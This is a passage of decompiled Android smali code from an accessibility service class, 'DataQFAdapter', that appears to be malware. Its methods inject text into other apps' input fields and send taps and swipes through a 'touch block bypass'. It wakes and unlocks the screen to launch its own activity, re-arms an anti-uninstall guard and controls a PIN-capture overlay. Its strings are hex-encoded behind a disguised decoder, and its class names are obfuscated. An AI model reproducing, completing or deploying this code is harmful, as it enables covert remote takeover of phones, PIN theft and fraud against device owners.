    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 3
    .line 4
    .line 5
    move-result-object v1

    .line 6
    if-nez v1, :cond_0

    .line 7
    .line 8
    return v0

    .line 9
    :cond_0
    invoke-direct {p0, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->findFocusedEditText(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 10
    .line 11
    .line 12
    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 13
    const/4 v3, 0x1

    .line 14
    if-eqz v2, :cond_7

    .line 15
    .line 16
    const/16 v4, 0x43

    .line 17
    .line 18
    const/high16 v5, 0x200000

    .line 19
    .line 20
    const-string v6, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    .line 21
    .line 22
    if-ne p1, v4, :cond_3

    .line 23
    .line 24
    :try_start_1
    invoke-direct {p0, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->getRealText(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 25
    .line 26
    .line 27
    move-result-object p1

    .line 28
    invoke-interface {p1}, Ljava/lang/CharSequence;->length()I

    .line 29
    .line 30
    .line 31
    move-result v4

    .line 32
    if-lez v4, :cond_2

    .line 33
    .line 34
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    .line 35
    .line 36
    .line 37
    move-result v4

    .line 38
    sub-int/2addr v4, v3

    .line 39
    if-gez v4, :cond_1

    .line 40
    .line 41
    move/from16 v4, v0

    .line 42
    :cond_1
    invoke-static {p1, v4}, Lv/s/KgSM0TsKUpCiuePB;->KV57Z6oavcB595B8Dy8Z(Ljava/lang/String;I)Ljava/lang/String;

    .line 43
    .line 44
    .line 45
    move-result-object p1

    .line 46
    new-instance v4, Landroid/os/Bundle;

    .line 47
    .line 48
    invoke-direct {v4}, Landroid/os/Bundle;-><init>()V

    .line 49
    .line 50
    .line 51
    invoke-virtual {v4, v6, p1}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    .line 52
    .line 53
    .line 54
    invoke-virtual {v2, v5, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    .line 55
    .line 56
    .line 57
    goto :goto_0

    .line 58
    :catch_0
    move-exception p1

    .line 59
    goto/16 :goto_2

    .line 60
    :cond_2
    :goto_0
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 61
    .line 62
    .line 63
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 64
    .line 65
    .line 66
    return v3

    .line 67
    :cond_3
    const v4, 0x42

    .line 68
    .line 69
    if-ne p1, v4, :cond_6

    .line 70
    .line 71
    const p1, 0x100

    .line 72
    .line 73
    invoke-virtual {v2, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 74
    .line 75
    .line 76
    move-result p1

    .line 77
    if-nez p1, :cond_5

    .line 78
    .line 79
    const/16 p1, 0x10

    .line 80
    .line 81
    invoke-virtual {v2, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 82
    .line 83
    .line 84
    move-result p1

    .line 85
    if-eqz p1, :cond_4

    nop

    nop

    .line 86
    .line 87
    goto :goto_1

    .line 88
    :cond_4
    invoke-direct {p0, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->getRealText(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 89
    .line 90
    .line 91
    move-result-object p1

    .line 92
    new-instance v4, Landroid/os/Bundle;

    .line 93
    .line 94
    invoke-direct {v4}, Landroid/os/Bundle;-><init>()V

    .line 95
    .line 96
    .line 97
    new-instance v7, Ljava/lang/StringBuilder;

    .line 98
    .line 99
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 100
    .line 101
    .line 102
    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 103
    .line 104
    .line 105
    const-string p1, "\n"

    .line 106
    .line 107
    invoke-virtual {v7, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 108
    .line 109
    .line 110
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 111
    .line 112
    .line 113
    move-result-object p1

    .line 114
    invoke-virtual {v4, v6, p1}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    .line 115
    .line 116
    .line 117
    invoke-virtual {v2, v5, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    .line 118
    .line 119
    .line 120
    :cond_5
    :goto_1
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 121
    .line 122
    .line 123
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 124
    .line 125
    .line 126
    return v3

    .line 127
    :cond_6
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 128
    .line 129
    .line 130
    :cond_7
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 131
    .line 132
    .line 133
    const-string p1, "00080073004200C700F500A900D700A90037002C001B"

    .line 134
    .line 135
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 136
    .line 137
    .line 138
    return v3

    .line 139
    :goto_2
    const-string v1, "003300730049008100FF00AD00DF008C0026006F007E009100F500B100C600E7002600640049008800E200E50092"

    .line 140
    .line 141
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 142
    .line 143
    .line 144
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 145
    .line 146
    .line 147
    return v0

    nop
.end method

.method public final performLongClick(IIJ)Z
    .locals 7

    .line 1
    :try_start_0
    new-instance v1, Landroid/graphics/Path;

    .line 2
    .line 3
    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    .line 4
    .line 5
    .line 6
    int-to-float v0, p1

    .line 7
    int-to-float v2, p2

    .line 8
    invoke-virtual {v1, v0, v2}, Landroid/graphics/Path;->moveTo(FF)V

    .line 9
    .line 10
    .line 11
    new-instance v6, Landroid/accessibilityservice/GestureDescription$Builder;

    .line 12
    .line 13
    invoke-direct {v6}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    .line 14
    .line 15
    .line 16
    new-instance v0, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    .line 17
    .line 18
    const-wide/16 v2, 0x0

    nop

    nop

    .line 19
    .line 20
    move-wide v4, p3

    nop

    nop

    .line 21
    invoke-direct/range {v0 .. v5}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    .line 22
    .line 23
    .line 24
    invoke-virtual {v6, v0}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    .line 25
    .line 26
    .line 27
    invoke-virtual {v6}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    .line 28
    .line 29
    .line 30
    move-result-object p3

    .line 31
    const-string p4, "000F00790055008000D300B300DB00A40028003E"

    .line 32
    .line 33
    invoke-static {p4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 34
    .line 35
    .line 36
    move-result-object p4

    nop

    nop

    .line 37
    new-instance v0, Ljava/lang/StringBuilder;

    .line 38
    .line 39
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 40
    .line 41
    .line 42
    invoke-virtual {v0, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 43
    .line 44
    .line 45
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 46
    .line 47
    .line 48
    const-string p1, ","

    .line 49
    .line 50
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 51
    .line 52
    .line 53
    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 54
    .line 55
    .line 56
    const-string p1, ")"

    .line 57
    .line 58
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 59
    .line 60
    .line 61
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object p1

    .line 65
    invoke-direct {p0, p3, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->dispatchWithTouchBlockBypass(Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 66
    .line 67
    .line 68
    const/4 p1, 0x1

    .line 69
    return p1

    .line 70
    :catch_0
    move-exception v0

    nop

    .line 71
    move-object p1, v0

    .line 72
    const-string p2, "003300730049008100FF00AD00DF008B002C0078005C00A400FC00B600D100AC006300730049009500FF00AD008800E7"

    .line 73
    .line 74
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 78
    .line 79
    .line 80
    const/4 p1, 0x0

    .line 81
    return p1
.end method

.method public final performSwipe(IIIIJ)Z
    .locals 8

    .line 1
    const-string v0, ","

    .line 2
    .line 3
    :try_start_0
    new-instance v2, Landroid/graphics/Path;

    .line 4
    .line 5
    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    .line 6
    .line 7
    .line 8
    int-to-float v1, p1

    .line 9
    int-to-float v3, p2

    nop

    nop

    .line 10
    invoke-virtual {v2, v1, v3}, Landroid/graphics/Path;->moveTo(FF)V

    .line 11
    .line 12
    .line 13
    int-to-float v1, p3

    .line 14
    int-to-float v3, p4

    .line 15
    invoke-virtual {v2, v1, v3}, Landroid/graphics/Path;->lineTo(FF)V

    .line 16
    .line 17
    .line 18
    new-instance v7, Landroid/accessibilityservice/GestureDescription$Builder;

    .line 19
    .line 20
    invoke-direct {v7}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    .line 21
    .line 22
    .line 23
    new-instance v1, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    .line 24
    .line 25
    const-wide/16 v3, 0x0

    .line 26
    .line 27
    move-wide v5, p5

    .line 28
    invoke-direct/range {v1 .. v6}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    .line 29
    .line 30
    .line 31
    invoke-virtual {v7, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    .line 32
    .line 33
    .line 34
    invoke-virtual {v7}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    .line 35
    .line 36
    .line 37
    move-result-object p5

    .line 38
    const-string p6, "001000610052009700F500F7"

    .line 39
    .line 40
    invoke-static {p6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 41
    .line 42
    .line 43
    move-result-object p6

    .line 44
    new-instance v1, Ljava/lang/StringBuilder;

    .line 45
    .line 46
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 47
    .line 48
    .line 49
    invoke-virtual {v1, p6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 50
    .line 51
    .line 52
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 53
    .line 54
    .line 55
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 56
    .line 57
    .line 58
    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 59
    .line 60
    .line 61
    const-string p1, "->"

    .line 62
    .line 63
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 64
    .line 65
    .line 66
    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 67
    .line 68
    .line 69
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 70
    .line 71
    .line 72
    invoke-virtual {v1, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 73
    .line 74
    .line 75
    const-string p1, ")"

    .line 76
    .line 77
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 78
    .line 79
    .line 80
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 81
    .line 82
    .line 83
    move-result-object p1

    .line 84
    invoke-direct {p0, p5, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->dispatchWithTouchBlockBypass(Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 85
    .line 86
    .line 87
    const/4 p1, 0x1

    .line 88
    return p1

    .line 89
    :catch_0
    move-exception v0

    .line 90
    move-object p1, v0

    .line 91
    const-string p2, "003300730049008100FF00AD00DF00940034007F004B008200B000BA00C000B5002C0064000100C7"

    .line 92
    .line 93
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 94
    .line 95
    .line 96
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 97
    .line 98
    .line 99
    const/4 p1, 0x0

    .line 100
    return p1
.end method

.method public final performTextInput(Ljava/lang/String;)Z
    .locals 3

    .line 1
    const/16 v0, 0x0

    .line 2
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 3
    .line 4
    .line 5
    move-result-object v1

    .line 6
    if-nez v1, :cond_0

    .line 7
    .line 8
    return v0

    .line 9
    :cond_0
    invoke-direct {p0, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->findFocusedEditText(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 10
    .line 11
    .line 12
    move-result-object v2

    .line 13
    if-eqz v2, :cond_1

    nop

    .line 14
    .line 15
    invoke-direct {p0, v2, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->pasteText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    .line 16
    .line 17
    .line 18
    move-result p1

    .line 19
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 20
    .line 21
    .line 22
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 23
    .line 24
    .line 25
    return p1

    .line 26
    :catch_0
    move-exception p1

    .line 27
    goto :goto_0

    .line 28
    :cond_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 29
    .line 30
    .line 31
    const-string p1, "000D0079001B008100FF00BC00C700B400260072001B00A200F400B600C600930026006E004F00C700F600B000C700A90027"

    .line 32
    .line 33
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 34
    .line 35
    .line 36
    return v0

    nop

    nop

    .line 37
    :goto_0
    const-string v1, "003300730049008100FF00AD00DF00930026006E004F00AE00FE00AF00C700B3006300730049009500FF00AD008800E7"

    .line 38
    .line 39
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 43
    .line 44
    .line 45
    return v0
.end method

.method public final performWakeScreen()Z
    .locals 8

    .line 1
    :try_start_0
    const-string v0, "power"

    .line 2
    .line 3
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/os/PowerManager;

    .line 8
    .line 9
    invoke-virtual {v0}, Landroid/os/PowerManager;->isInteractive()Z

    .line 10
    .line 11
    .line 12
    move-result v1

    .line 13
    const/4 v2, 0x1

    .line 14
    if-eqz v1, :cond_0

    .line 15
    .line 16
    const-string v0, "001000750049008200F500B1009200A6002F0064005E008600F400A6009200A8002D"

    .line 17
    .line 18
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 19
    .line 20
    .line 21
    return v2

    nop

    .line 22
    :catch_0
    move-exception v0

    .line 23
    goto :goto_0

    .line 24
    :cond_0
    const-wide/16 v3, 0x3e8

    .line 25
    .line 26
    :try_start_1
    const-string v1, "00150058007800DD00C000AD00DD00BF0014007700500082"

    .line 27
    .line 28
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    move-result-object v1

    .line 32
    const/16 v5, 0x20

    .line 33
    .line 34
    invoke-virtual {v0, v5, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 35
    .line 36
    .line 37
    move-result-object v1

    .line 38
    invoke-virtual {v1, v3, v4}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    .line 39
    .line 40
    .line 41
    new-instance v5, Lv/s/dgYqeynPOIkCjV1UTWhk;

    .line 42
    .line 43
    const/16 v6, 0x0

    .line 44
    invoke-direct {v5, v6, v1}, Lv/s/dgYqeynPOIkCjV1UTWhk;-><init>(ILjava/lang/Object;)V

    .line 45
    .line 46
    .line 47
    const-wide/16 v6, 0xc8

    .line 48
    .line 49
    invoke-direct {p0, v5, v6, v7}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 50
    .line 51
    .line 52
    :catch_1
    :try_start_2
    const-string v1, "00150058007800DD00C700BE00D900A2001000750049008200F500B1"

    .line 53
    .line 54
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 55
    .line 56
    .line 57
    move-result-object v1

    .line 58
    const v5, 0x3000000a

    .line 59
    .line 60
    .line 61
    invoke-virtual {v0, v5, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 62
    .line 63
    .line 64
    move-result-object v1

    nop

    nop

    .line 65
    const-wide/16 v5, 0x1f40

    .line 66
    .line 67
    invoke-virtual {v1, v5, v6}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    .line 68
    .line 69
    .line 70
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 71
    .line 72
    const/16 v6, 0x1b

    .line 73
    .line 74
    if-lt v5, v6, :cond_1

    .line 75
    .line 76
    :try_start_3
    new-instance v5, Landroid/content/Intent;

    .line 77
    .line 78
    const-class v6, Lapp/mobilex/plus/HandlerSJAdapter;

    .line 79
    .line 80
    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 81
    .line 82
    .line 83
    const/high16 v6, 0x50810000

    .line 84
    .line 85
    invoke-virtual {v5, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 86
    .line 87
    .line 88
    const-string v6, "003400770050008200CF00B000DC00AB003A"

    nop

    .line 89
    .line 90
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 91
    .line 92
    .line 93
    move-result-object v6

    .line 94
    invoke-virtual {v5, v6, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 95
    .line 96
    .line 97
    invoke-virtual {p0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 98
    .line 99
    .line 100
    :catch_2
    :cond_1
    :try_start_4
    new-instance v5, Lv/s/CBfuES2Lekt8n;

    .line 101
    .line 102
    const/16 v6, 0x1

    .line 103
    invoke-direct {v5, v0, v6, v1}, Lv/s/CBfuES2Lekt8n;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    .line 104
    .line 105
    .line 106
    invoke-direct {p0, v5, v3, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 107
    .line 108
    .line 109
    const-string v0, "001000750049008200F500B1009200B00022007D005E00C700E400AD00DB00A0002400730049008200F400FF009A00AA0036007A004F008E00BD00B200D700B3002B0079005F00CE"

    .line 110
    .line 111
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 112
    .line 113
    .line 114
    goto :goto_1

    .line 115
    :goto_0
    const-string v1, "003300730049008100FF00AD00DF00900022007D005E00B400F300AD00D700A2002D0036005E009500E200B000C000FD0063"

    .line 116
    .line 117
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 118
    .line 119
    .line 120
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 121
    .line 122
    .line 123
    const/4 v2, 0x0

    .line 124
    :goto_1
    return v2
.end method

.method public final rearmAntiUninstall()V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->l1V0lQr6TbwNKqHfXNbb()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    if-eqz v0, :cond_0

    .line 11
    .line 12
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 13
    .line 14
    :cond_0
    return-void
.end method

.method public final setPinOverlayTouchable$app_release(Z)V
    .locals 4

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 2
    .line 3
    if-nez v0, :cond_0

    .line 4
    .line 5
    goto/16 :goto_1

    .line 6
    :cond_0
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayView:Landroid/view/View;

    .line 7
    .line 8
    if-nez v1, :cond_1

    .line 9
    .line 10
    goto/16 :goto_1

    .line 11
    :cond_1
    :try_start_0
    invoke-virtual {v1}, Landroid/view/View;->getLayoutParams()Landroid/view/ViewGroup$LayoutParams;

    .line 12
    .line 13
    .line 14
    move-result-object v2

    .line 15
    check-cast v2, Landroid/view/WindowManager$LayoutParams;

    .line 16
    .line 17
    if-eqz p1, :cond_2

    .line 18
    .line 19
    const/16 v3, 0x28

    .line 20
    .line 21
    iput v3, v2, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 22
    .line 23
    goto :goto_0

    .line 24
    :cond_2
    const/16 v3, 0x38

    .line 25
    .line 26
    iput v3, v2, Landroid/view/WindowManager$LayoutParams;->flags:I

    nop

    .line 27
    .line 28
    :goto_0
    invoke-interface {v0, v1, v2}, Landroid/view/ViewManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 29
    .line 30
    .line 31
    iput-boolean p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    nop

    nop
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 32
    .line 33
    :catchall_0
    :goto_1
    return-void
.end method
